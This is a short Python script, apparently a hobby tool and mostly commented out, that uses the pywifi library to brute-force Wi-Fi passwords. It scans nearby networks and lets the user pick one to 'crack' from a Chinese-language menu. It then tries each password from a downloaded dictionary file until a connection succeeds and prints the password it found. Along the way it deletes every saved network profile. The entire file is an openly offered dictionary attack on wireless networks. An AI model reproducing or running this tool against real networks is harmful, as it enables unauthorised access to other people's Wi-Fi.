import pywifi
# from pywifi import const
# import time
# import inquirer
#
#
# def connect(name, password):
#     interface = pywifi.PyWiFi().interfaces()[0]
#     interface.disconnect()  # 中斷目前wifi連線
#     time.sleep(1)
#     if interface.status() == const.IFACE_DISCONNECTED:
#         prof = pywifi.Profile()
#         prof.ssid = name  # wifi的ssid(wifi名稱)
#         prof.key = password  # wifi的密碼
#         prof.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
#         prof.auth = const.AUTH_ALG_OPEN  # 網卡的開放
#         prof.cipher = const.CIPHER_TYPE_CCMP  # 加密單元
#         interface.remove_all_network_profiles()  # 刪除所有的wifi文件
#         tep_prof = interface.add_network_profile(prof)
#         interface.connect(tep_prof)  # 自動連上破解的wifi
#         time.sleep(1)
#         if interface.status() == const.IFACE_CONNECTED:
#             return True
#         else:
#             return False
#
#
# def main():
#     file = open("D:/password.txt", 'r')  # 打開下載的密碼字典
#     wifis = []
#     iface = pywifi.PyWiFi().interfaces()[0]  # 掃描現有的wifi
#     res = iface.scan_results()
#     for i, prof in enumerate(res):
#         wifis.append(prof.ssid)
#     questions = [  # wifi選單
#         inquirer.List('wifi', message="你要破解哪個wifi?", choices=wifis),
#     ]
#     answers = inquirer.prompt(questions)
#     curr_name = answers['wifi']
#
#     while 1:
#         curr_pwd = file.readline()
#         try:
#             status = connect(curr_name, curr_pwd)
#             if status:
#                 print("密碼是:" + curr_pwd)
#                 break
#             else:
#                 print("錯誤的密碼:%s" % curr_pwd)
#         except:
#             continue
#     file.close()
#
#
# if __name__ == '__main__':
#     main()